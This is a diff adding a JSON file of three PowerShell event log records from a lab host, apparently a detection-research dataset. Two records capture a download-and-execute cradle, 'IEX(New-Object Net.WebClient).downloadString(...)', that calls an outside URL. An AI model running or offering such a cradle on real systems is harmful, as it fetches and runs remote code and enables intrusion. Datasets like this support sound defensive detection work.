@@ -1,0 +1,32 @@
+[
+  {
+    "timestamp": "2022-01-24T20:11:11.361955Z",
+    "host": "fs03vuln.offsec.lan",
+    "event_id": 4104,
+    "record_id": 83421,
+    "event_uid": "207cb97c427683bd4a6932c68a4ab823edf3327a0e495c082851f6b439194865",
+    "script_block": "\"IEX(New-Object Net.WebClient).downloadString('https://miro.medium.com/max/1400/1*FnPDYeZVrGTbuE7Lj7JhgQ.png')\"",
+    "context": null,
+    "payload": null
+  },
+  {
+    "timestamp": "2022-01-24T20:11:11.361955Z",
+    "host": "fs03vuln.offsec.lan",
+    "event_id": 4103,
+    "record_id": 83422,
+    "event_uid": "88e62e82582913f9d9a1dd3cbc0cb0940b63b3e03621a413e86b3d9a58727432",
+    "script_block": null,
+    "context": "        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 4.0\n        Host ID = 5a3793a4-31d1-4d3d-a8d1-4cd874d06e70\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n        Engine Version = 4.0\n        Runspace ID = e9d4be2a-52cd-483a-a7d1-e10f67df6e6c\n        Pipeline ID = 13\n        Command Name = \n        Command Type = Script\n        Script Name = \n        Command Path = \n        Sequence Number = 24\n        User = OFFSEC\\admmig\n        Shell ID = Microsoft.PowerShell\n",
+    "payload": "CommandInvocation(Out-Default): \"Out-Default\"\nParameterBinding(Out-Default): name=\"InputObject\"; value=\"IEX(New-Object Net.WebClient).downloadString('https://miro.medium.com/max/1400/1*FnPDYeZVrGTbuE7Lj7JhgQ.png')\"\n"
+  },
+  {
+    "timestamp": "2022-01-24T20:11:11.361955Z",
+    "host": "fs03vuln.offsec.lan",
+    "event_id": 4104,
+    "record_id": 83423,
+    "event_uid": "783ce43a5f5c6e4d4a623940bb4c8bb86e73391a94b017ea57cceeffb62f9c4f",
+    "script_block": "prompt",
+    "context": null,
+    "payload": null
+  }
+]
